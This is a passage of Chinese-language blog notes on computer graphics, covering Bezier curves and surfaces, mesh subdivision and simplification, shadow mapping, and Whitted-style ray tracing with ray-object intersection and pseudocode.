<p>所得到的贝塞尔曲线是完全正确的，可总感觉怪怪的，在某些点感觉根本不受控制点的“控制”。这正是由于控制点众多，很难控制局部的贝塞尔曲线形状。为了解决该问题，有人提出了分段贝塞尔曲线，即将一条高次曲线分成多条低次曲线的拼接，其中用的最多的便是用很多的3次曲线（4个控制点）来拼接，如下图：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710192228612.png" alt="image-20220710192228612" style="zoom:40%;" loading="lazy">

<p>图中，①②③④点是第一段贝塞尔曲线的控制点，④⑤⑥⑦是第二段贝塞尔曲线的控制点，⑦⑧⑨⑩是第三段贝塞尔曲线的控制点，我们可以分段得到曲线之后连接。但这种表示方法也有很大的问题，如上图第二段与第三段曲线的连接点⑦处，曲线出现了非常大的偏转，如何在连接点处做到平滑的过度？</p>
<p>我们知道贝塞尔曲线的特点，<strong>必定经与起始与终止线段相切</strong>，如上图，第一段曲线的终点斜率同线段③④的斜率，而第二段曲线的起点斜率同线段④⑤的斜率，如果这两个线段的尾部和头部的斜率一样是否就能达到平滑的额效果呢，答案是肯定的。我们要做的是<strong>确保③⑤两个点在同一条直线上且③④长度等于④⑤长度</strong>。</p>
<p>最后要介绍一下贝塞尔曲线的连续性：</p>
<p>$C^0$ 连续性：第一段曲线的终点为第二段曲线的起点。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710192941410.png" alt="image-20220710192941410" style="zoom: 33%;" loading="lazy">

<p>$C^1$连续性：就是上述说到的平滑过渡。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710193051474.png" alt="image-20220710193051474" style="zoom: 33%;" loading="lazy">

<p><a href="https://math.hws.edu/eck/cs424/notes2013/canvas/bezier.html">贝塞尔曲线测试demo </a>挺好玩的，可以自己动手试试。</p>
<h2 id="贝塞尔曲面（Bezier-Surfaces）"><a href="#贝塞尔曲面（Bezier-Surfaces）" class="headerlink" title="贝塞尔曲面（Bézier Surfaces）"></a>贝塞尔曲面（Bézier Surfaces）</h2><p>其实在理解了贝塞尔曲线之后，贝塞尔曲面的原理也是十分容易理解的了，无非是一个从2维到3维的过渡。</p>
<p>如果说对于曲线来说只有一个参数 $t\in[0,1]$ 那么对于一个面来说，就应该有两个参数，分别设 $ u\in[0,1]$，$v\in[0,1]$，具体过程如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514212901367.png" alt="img" style="zoom:50%;" loading="lazy">

<p>举一个 $4*4 &#x3D; 16$个控制点的例子，其水平面位置如图中16个黑点所示（并未表示出高度，防止图形太乱），将这16个点分成4列，图中红色圈中的为一列的具体例子。</p>
<p><strong>第1步：在每列4个控制点之下利用第一个参数 $u$ 运用计算贝塞尔曲线的方法得到空中的四条灰色贝塞尔曲线，同时可以得到同一个 $u$ 下所示的4个蓝色点。</strong></p>
<p><strong>第2步：在得到4个蓝色顶点之后，在这四个蓝色顶点的基础之下利用第二个参数 $v$ 便可以成功得出贝塞尔曲面上的正确一点</strong></p>
<p><strong>第3步：遍历所有的 $u，v$ 值就可以成功得到一个贝塞尔曲面</strong></p>
<h2 id="曲面细分（Mesh-Subdivision）"><a href="#曲面细分（Mesh-Subdivision）" class="headerlink" title="曲面细分（Mesh Subdivision）"></a>曲面细分（Mesh Subdivision）</h2><p>曲面细分是指将一个模型的面合理的分成更多小的面，从而提升模型精度，提高渲染效果，大白话就是将大三角形分成很多个小三角形。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516092149255.png" alt="img" style="zoom:50%;" loading="lazy">

<p>如何做呢？</p>
<h3 id="Loop细分（Loop-Subdivision）"><a href="#Loop细分（Loop-Subdivision）" class="headerlink" title="Loop细分（Loop Subdivision）"></a>Loop细分（Loop Subdivision）</h3><p>Loop细分（Loop是发明人的姓氏，不是循环的意思…）是一种<strong>专门针对三角形面</strong>的细分方法，其核心步骤：</p>
<p><strong>生成更多的三角形跟点</strong></p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516093746861.png" alt="img" style="zoom:50%;" loading="lazy">

<p>如图所示在连接每条边的中点生成一个新的三角形，原来的三角形就会被分割成4个三角形。</p>
<p><strong>调整这些三角形或顶点的位置</strong></p>
<p>图形的细分必然会导致位置的改变，如何合理更改位置使得模型更加美观是细分的第二步。我们将所有的顶点分为两类，一类是新生成的顶点，一类是老的原来就有的顶点，对于新生成的顶点做如下处理：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516093948110.png" alt="img" style="zoom:50%;" loading="lazy">

<p>这里新的顶点就是白色的那个顶点，其位置为周围4个顶点的权重之和（具体推到属于数学领域，不做深究），各顶点权重如图所示，其余边上的新顶点处理类似。</p>
<p>对于旧的顶点，做如下处理：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516094130260.png" alt="img" style="zoom:50%;" loading="lazy">

<p>其实旧每个顶点的处理也十分类似，这里以图中一个白色旧顶点为例，也是其自身以及邻接顶点的权重和，但权重的设置与该旧顶点度数有关。其中 $n$ 表示点的度数，学过数据结构的应该都知道度这个概念，就是与点相连的边的个数，$u$ 跟新节点表示方法一样为权重。</p>
<p>效果还是挺好的：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710194448263.png" alt="image-20220710194448263" style="zoom:50%;" loading="lazy">

<h3 id="Catmull-Clark细分-Catmull-Clark-Subdivision）"><a href="#Catmull-Clark细分-Catmull-Clark-Subdivision）" class="headerlink" title="Catmull-Clark细分(Catmull-Clark Subdivision）"></a>Catmull-Clark细分(Catmull-Clark Subdivision）</h3><p>Loop细分只能处理三角形面的细分，那么对于不仅仅只有三角形面该怎么办呢？这也就有了Catmull-Clark细分。</p>
<p>首先做一些定义：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516101638829.png" alt="img" style="zoom:50%;" loading="lazy">

<p><strong>1. 对于所有不是四边形的面，称之为Non-quad face</strong><br><strong>2. 所有度不为4的顶点称之为奇异点，标记出来</strong><br><strong>3. 每次细分步骤如图中所示，在每个面中都添加一个点，在每条边的中点也都添加一个点，面上的新顶点连接所有边上的新顶点，进行四边形的细分。之后在每个Non-quad face中随便找一个点连接</strong></p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516102012880.png" alt="img" style="zoom:50%;" loading="lazy">

<p>考虑右下角几个问题，其实也是一些Catmull-Clark细分的特点：</p>
<p><strong>1. 有几个非四边形面，就会多出几个奇异点，所以现在一共有2+2 &#x3D; 4个</strong><br><strong>2. 新多出来的奇异点的度数与原来所在面的边数相等，如这里就是3度</strong><br><strong>3. 第一次细分之后所有面都会变成四边形，且往后奇异点数目不再增加</strong></p>
<p>这里给出一个再一次细分的结果：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516102323205.png" alt="img" style="zoom:50%;" loading="lazy">

<p>可以看到奇异点依然是4个，不再改变。</p>
<p>以上我们明白了如何增加新顶点，与Loop细分类似，同样需要去调整各类顶点的位置，这里将所有的顶点分为三类，对于各类顶点位置调整如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516102758734.png" alt="img" style="zoom:50%;" loading="lazy">

<p>下图是两种细分方法的效果对比：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516102941240.png" alt="img" style="zoom:50%;" loading="lazy">

<h2 id="曲面简化（Mesh-Smplication）"><a href="#曲面简化（Mesh-Smplication）" class="headerlink" title="曲面简化（Mesh Smplication）"></a>曲面简化（Mesh Smplication）</h2><p>为了得到更好的光滑模型，我们需要进行曲面细分。那为什么要曲面简化呢，那样不是让模型精度降低了吗。没错，要的就是模型精度降低的效果。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516092232933.png" alt="img" style="zoom:50%;" loading="lazy">

<p>一方面，降低模型精度可以提高性能；另一方面，在某些情况下，我们根本就没有必要呈现那么完美的模型，例如：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710195515671.png" alt="image-20220710195515671" style="zoom:50%;" loading="lazy">

<p>在距离足够远的情况下，我们根本看不出来30000个三角形与3000个三角形的区别。换句话说，我们只需要在摄像机离模型十分近的情况下才需要展示精度高的模型，其他情况下适当降低精度可以大大提高计算机性能。</p>
<p>换个角度，这是否与纹理映射中Mipmap差不多呢？在某个像素点离摄像机十分远，这个点就会对应texture中十分大的一片区域，对应mipmap，我们并不需要用 Level 等级低的贴图去渲染。这个也类似，离摄像机十分远进行“模糊”是十分有必要的。</p>
<p>如何做呢？曲面简化所利用的一个方法叫做边坍缩（Edge collapse），如下图所示就是将一条边的两个顶点合成为一个顶点。但随之而来的问题就是，曲面简化需要尽量保持原本模型的shape，如何坍缩一条边，或者说坍缩哪一条边能够使得原模型样貌被改变的程度最小，这就是曲面简化的关键所在。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/2020051610440617.png" alt="img" style="zoom:50%;" loading="lazy">

<p>为此引入一个度量，即二次误差度量(Quadric Error Metrics)。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516105346220.png" alt="img" style="zoom:50%;" loading="lazy">

<p>即坍缩之后蓝色新顶点所在的位置与原来各个平面的垂直距离之和。如果能够使得这个误差最小那么对整个模型样貌修改一定程度上也会较小。那么其实到这整个曲面简化的算法流程已经比较清晰了：</p>
<p><strong>1. 为模型每条边赋值，其值为坍缩这条边之后，代替两个老顶点的新顶点所能得到的最小二次误差度量</strong><br><strong>2. 选取权值最小的边做坍缩，新顶点位置为原来计算得出使得二次误差最小的位置</strong><br><strong>3. 坍缩完之后，与之相连其他的边的位置会改动，更新这些边的权值</strong><br><strong>4. 重复上述步骤，直到到达终止条件</strong></p>
<p>这其实是一个标准的贪心算法，可能到不了全局最优解，但事实证明最终的结果依然相当不错。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200516110042210.png" alt="img" style="zoom:50%;" loading="lazy">



]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>几何</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机图形学六：光线追踪-Ray Tracing</title>
    <url>/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="阴影映射（Shadow-Mapping）"><a href="#阴影映射（Shadow-Mapping）" class="headerlink" title="阴影映射（Shadow Mapping）"></a>阴影映射（Shadow Mapping）</h1><p>其实这应该是属于纹理映射这一块的知识，但是闫老师当时没说，知道几何的最后一块才说，因为这又与光线追踪有关，所以我就把它记录于此。</p>
<p>前面我们说过着色，它仅仅考虑着色点与光照这两者，忽略了其他物体甚至自身对于着色点的遮挡关系，这显然是不对的。光源被遮挡，必然会产生阴影，而光栅化并不能很好的表示这种阴影。而阴影映射可以较好的解决这个问题。</p>
<p>再来一遍废话，为什么会有阴影？</p>
<p><strong>因为光源照射不到，更具体点，摄像机能看到的地方，光源“看”不见。</strong></p>
<p>而这正是启发阴影贴图这种做法的动机，接下来我们便来看看详细过程是怎么样的。</p>
<p><strong>第一步，把光源当做一个摄像机让它去看，去渲染整个场景一遍从而得到从光源视角的深度Buffer，记为 $d_{map}$。它被记录在 shadow map中。如图中就记录了四个点的深度</strong></p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200516142332876.png" alt="img" style="zoom:50%;" loading="lazy">

<p>**第二步，从设定好的摄像机位置去真正的渲染场景得到摄像机视角的深度Buffer，记为 $d$ **</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200516142544728.png" alt="img" style="zoom:50%;" loading="lazy">

<p>**第三步，将所有摄像机视角可见点，利用光源视角下的那一套投影矩阵，重新投影回光源，找到与shadow map上对应的 $d_{map}$ **</p>
<p><strong>如果该点的 $d_{map}$ 与 $d$ 相等，则说明此点可被光源与摄像机共同看见，因此不在阴影中，如下图橘色线条这种情况：</strong></p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200516143052471.png" alt="img" style="zoom:50%;" loading="lazy">

<p><strong>如果该点的 $d_{map}$ 小于 $d$  ，则说明此点不可被光源看见，但摄像机看得见，即该点前方有物体遮挡，因此在阴影中，如下图红色线这种情况：</strong></p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200516143538544.png" alt="img" style="zoom:50%;" loading="lazy">

<p>如此便能确定每个可见像素点是否在阴影之中了，如果在阴影之中就不去计算Blinn-Phong中的镜面反射项与漫反射项。效果如下图：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200516143958291.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>对应可视化的shadow map如下，距离光源越近代表深度越小，所以颜色越黑（同Z-Buffer），反之亦然：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200516144150611.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>阴影映射这种方式确实可以较好表示阴影，但它仍有限制：只适用于点光源，只能描述硬阴影。</p>
<p>什么是硬阴影？什么是软阴影？软硬阴影示意如下，上方棱角分明为硬阴影，下方为软阴影：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDY1NTA5,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述" style="zoom: 80%;" loading="lazy">

<p>可见现实生活中，软阴影更符合认知，在阴影与没有阴影之间有一个渐变的过度，更加自然。产生软阴影是因为光源具有体积，导致，有的地方完全看不到光源（本影, Umbra）， 有的地方能看到一部分光源（半影，Penumbra）。所以阴影的边缘会有过渡的情况，从而产生软阴影，就像上图中太阳与地球的示意一样（全日食与半日食）。</p>
<h1 id="Whitted-Style-光线追踪"><a href="#Whitted-Style-光线追踪" class="headerlink" title="Whitted-Style 光线追踪"></a>Whitted-Style 光线追踪</h1><p>首先要清楚的是，我们为什么需要光线追踪？</p>
<p>在光栅化着色这一章节中，我们介绍了Blinn-Phong反射模型，但这个模型的 bug 之处也是十分明显的，它只考虑了光源到物体的直接光照，其它的间接光照一概不考虑，物体之前的遮挡关系也不考虑。这显然是不对的，例如：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200523140117832.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>如上图中房屋顶部的所接受到的光可不仅仅是Blinn-Phong模型考虑的直接光源，还有可能是来自窗外的光源照射到地板，再发生反射照射到了房屋顶部，而这部分光是局部光照模型没有考虑到的，而光线追踪正是为了解决这种问题所提出的一种全局光照模型。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>光线追踪，顾名思义，核心是光线。首先对光线做一些假设：</p>
<p><strong>1. 光线一定沿着直线传播</strong><br><strong>2. 光线之间无法碰撞</strong><br><strong>3. 光线路径可逆，即从A发出的到B的光线，一定也可以从B发出到A（中途可发生反射和折射）</strong></p>
<p>人为什么能看到不同的物体？是因为从物体表面上有光进入了人眼。那由上述的假设是不是也可理解为人眼发出了很多感知光线碰撞到了物体，所以可以看见呢？在古代可还真就有不少人这么想：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200523141859616.png" alt="img" style="zoom:67%;" loading="lazy">

<p>当然现代物理知识已经告诉我们这种观点是错误的，但是并不妨碍从中获取一些灵感：<strong>光路可逆</strong>，所有进入到人眼的光，都可从人眼发出光按照原路反方向返回，那么利用这种<strong>模拟从人眼发射光线的方法不就可以还原出所有的光路</strong>了呢？这就是光线追踪的核心想法，反其道而行之。</p>
<p><strong>第一步：Ray Casting</strong></p>
<p>从人眼（摄像机）向近投影平面上的每一个像素点发射一条光线，判断与场景物体的交点，示意图如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200523142634629.png" alt="img" style="zoom:67%;" loading="lazy">

<p>当然一条光线自然可能会与不止一个物体相交，但是考虑遮挡关系，只去找最近的交点。接着连接该交点和光源，只要判断这条连线之间是否有物体存在就可以知道该交点是否在阴影之中（原理同上述shadow mapping）：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200523142939262.png" alt="img" style="zoom:67%;" loading="lazy">

<p>紧接着，自然可以利用Blinn-Phong模型对这个点进行局部光照模型计算，对该像素进行着色，那么遍历所有近投影平面上的像素就能得到一张完整的图像。到目前位置，这与Blinn-Phong模型的思路如出一辙。</p>
<p><strong>第二步 Recursive (Whitted-Style) Ray Tracing</strong></p>
<p>考虑第一步中所做的Ray Casting，该条光线第一个与圆球物体相交，假设该圆球是一个玻璃球，那么便会发生镜面反射，如图：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020052314423168.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>当然除了镜面反射之外，也存在折射，同时反射与折射出去的光线会可能与场景中的物体再次碰撞，发生第二次折射与反射：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200523144513629.png" alt="img" style="zoom:67%;" loading="lazy">

<p>当然，还有其他“无数次的反射与折射”</p>
<p>从图中可以见到，不仅仅是与圆球相交的那一点可以贡献光到达眼睛，折射与反射之后再与物体相交的点也可以贡献光（<strong>光路可逆原理</strong>）。简而言之，除了直接从光源照射到圆球交点再沿着 eye rays（第一条发射的光线）到眼睛中，也可能存在这样一种情形，有光照射到其他物体，再沿着eye rays的反射或折射的光线方向传回人眼。</p>
<p>因此每一个着色点的颜色贡献来自这样种几类型 <strong>直接光照，反射方向间接光，折射方向间接光（如果有折射的话）</strong></p>
<p>下一步将这些所有交点与光源连接，称这些线为shadow rays（因为可以用来检测阴影），计算这些所有点的局部光照模型的结果，将其按照光线能量权重累加，最终得到近投影平面上该像素点的颜色。这就是一个全局光照模型，因为不仅仅考虑了直接光源的贡献，还考虑各种折射与反射光线的贡献。</p>
<p>以上就是光线追踪的整个过程，还有额外几点要注意的：</p>
<ol>
<li>整体过程是一个递归（光无限的折射反射）的过程，因此需要一定的递归终止条件，比如说允许的最大反射或折射次数为10。</li>
<li>光线在每次反射和折射之后都有能量损耗的，由系数决定，因此越往后的折射和反射光贡献的能量越小。</li>
<li>如果反射或折射光线没有碰撞到物体，一般直接返回一个背景色。</li>
</ol>
<p>参考伪代码如下：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">RayTracing (original_point, ray_direction, objects, depth)&#123;  &#x2F;&#x2F;着色点，光线方向，物体，深度
	if(depth &gt; maxDepth)
		return color(0,0,0);          &#x2F;&#x2F;深度测试
	if(IsHitobject(original_point, ray_direction, objects))&#123;     &#x2F;&#x2F;如果光线与物体有交点
		hitPoint &#x3D; GetHitPoint();     &#x2F;&#x2F;找到交点
		normal &#x3D; GetNormal();         &#x2F;&#x2F;找到法线
        
		reflectionDirection &#x3D; reflect(ray_direction,normal); &#x2F;&#x2F;求得反射方向
		refractionDirection &#x3D; refract(ray_direction,normal); &#x2F;&#x2F;求得折射方向，如果没有折射，舍弃折射项
        
		local_ color &#x3D; BlinnPhongShader(original_point,normal,light_position)   &#x2F;&#x2F;着色
            
		return local color
			+ k1*RayTracing(hitPoint,reflectionDirection,objects,depth + 1);    &#x2F;&#x2F;继续从该反射光线求反射折射
			+ k2*RayTracing(hitPoint,refractionDirection,objects,depth + 1);    &#x2F;&#x2F;继续从该折射光线求反射折射
    &#125;
	else
		return background color;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="光线与物体求交"><a href="#光线与物体求交" class="headerlink" title="光线与物体求交"></a>光线与物体求交</h2><p>上述Whitted-Style模型中有一个重要的问题，我们如何得到光线与物体的交点呢？在讨论之前，我们先对光线进行一个定义。</p>
<h3 id="光线的表示方法"><a href="#光线的表示方法" class="headerlink" title="光线的表示方法"></a>光线的表示方法</h3><p>将每一条光线想象成一条射线，那么每一条光线都会由起点及方向这两个属性所固定，如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020052609151634.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>除了起点 $\bold{o}$ ，以及光线方向 $\bold{d}$ 之外，还额外定义了一个参数 $t$ 来表示光线行进的长度（ $t$ 当然是非负数，因为方向已定）。</p>
<h3 id="光线与隐式曲面求交"><a href="#光线与隐式曲面求交" class="headerlink" title="光线与隐式曲面求交"></a>光线与隐式曲面求交</h3><p>首先计算光线与隐式曲面的交点的方法，以一个球体为例，二者表示方程如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200526091858120.png" alt="img" style="zoom:50%;" loading="lazy">

<p>光线的表示方法在上节已经介绍过，对于一个球体来说，其表面上所有点 $\bold{p}$ , 到圆心 $\bold{c}$ 的距离是固定为 $R$ 的， 也就得到了上述的球的隐式曲面方程。那么对于一个光线会在什么时候与球相交呢？</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200526092104756.png" alt="img" style="zoom:67%;" loading="lazy">

<p>这个应该初中生都知道吧（嘻嘻），当然是在一个点既满足光线方程，又满足球体方程的时候，所以可以计算如下，把 $\bold{p} &#x3D; \bold{o}+t\bold{d}$ 代入球体方程，利用一元二次方程的解法即可得到参数 $t$ 值：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020052609234616.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>同样的根据 $b^2-4ac$ 的正负关系，即可判断光线与球是一个交点还是两个交点又或是没有交点，这个应该初中生都知道吧（嘻嘻）。</p>
<p>虽然这里只举了对一个球的隐式曲面交点的计算，对于所有其他隐式曲面过程都是类似的，只要将光线方程代入求解 $t$ 即可：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200526092649274.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<h3 id="光线与显示曲面求交"><a href="#光线与显示曲面求交" class="headerlink" title="光线与显示曲面求交"></a>光线与显示曲面求交</h3><p>在几何中提到过，最常用的曲面表示形式，是通过定义各个多边形面的顶点以及顶点之间的连接关系得到许许多多的三角形面。因此如何判断一条光线与显示曲面的交点，其实也就是计算光线与三角形面的交点。进一步想，直接求光线是否与三角形有交点可能比较难，我们可以通过先求光线是否与该三角形所在平面有交点，再判断交点是否在三角形内来进行判断。对于任意一个平面，可以用如下图中的式子表达：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200526093018274.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<p> $\bold{N}$ 是平面的法线， $\bold{p’}$ 是平面内的一点（这两个元素就可以确定一个平面了，想想看是不是这样）。 而 $ax+by+cz+d&#x3D;0$ 是高数中对平面的一般化表示。那么到这里其实已经成功把对显示曲面的求交又转化为了类似隐式曲面求交的方法。</p>
<p>首先给出如何计算光线与平面交点的过程：</p>
